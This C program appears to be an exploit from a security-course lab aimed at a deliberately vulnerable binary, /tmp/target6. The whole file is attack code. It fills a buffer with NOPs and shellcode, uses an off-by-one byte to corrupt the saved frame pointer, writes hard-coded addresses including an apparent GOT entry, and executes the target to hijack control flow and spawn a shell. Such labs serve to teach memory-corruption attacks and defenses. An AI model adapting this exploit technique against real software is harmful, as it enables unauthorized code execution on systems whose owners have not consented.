#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{ 
  char sploit[202];
  memset(sploit, '\x90', sizeof(sploit));
  sploit[sizeof(sploit)-2] = '\x01';
  sploit[sizeof(sploit)-1] = '\0';
  memcpy(sploit, shellcode, sizeof(shellcode)-1);

  int buf_addr = 0xbffffcc0;
  int new_ebp = 0xbffffd01;
  int offset = new_ebp - buf_addr;
  *(int*)(sploit + offset - 4) = 0x804a00c;
  *(int*)(sploit + offset - 8) = buf_addr;
  
  char *args[] = { TARGET, sploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
